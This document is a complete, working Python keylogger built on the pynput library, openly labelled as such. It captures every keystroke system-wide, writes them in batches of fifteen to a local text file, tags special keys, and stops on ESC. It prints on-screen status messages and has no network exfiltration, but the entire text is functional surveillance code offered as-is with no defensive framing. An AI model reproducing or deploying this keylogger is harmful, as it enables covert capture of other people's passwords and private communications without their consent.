from pynput import keyboard

log_file = "log_file.txt"
key_buffer = []  

def write_to_file(keys):
    
    with open(log_file, "a", encoding="utf-8") as f:
        for key in keys:
            
            clean_key = str(key).replace("'", "")
            
            if "space" in clean_key:
                f.write(" ")
            elif "enter" in clean_key:
                f.write("\n")
            elif "backspace" in clean_key:
                f.write("[SIL]")
            elif "Key" not in clean_key:
               
                f.write(clean_key)
            else:
               
                f.write(f" [{clean_key}] ")

def on_press(key):
    global key_buffer
    
    key_buffer.append(key)
  
    if len(key_buffer) >= 15:
        write_to_file(key_buffer)
        key_buffer.clear()  
def on_release(key):

    if key == keyboard.Key.esc:
        print("\n[!] ESC pressed. Stopping the Keylogger...")
        
       
        if len(key_buffer) > 0:
            write_to_file(key_buffer)
            
        return False

# Main program execution
print("=== Advanced Python Keylogger (Buffered) ===")
print("[*] Running in the background...")
print("[*] Type normally (it will save to disk every 15 keystrokes).")
print("[*] Press 'ESC' to terminate and save remaining keys.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("=== Keylogger Stopped ===")
print(f"Check '{log_file}' to see all captured data.")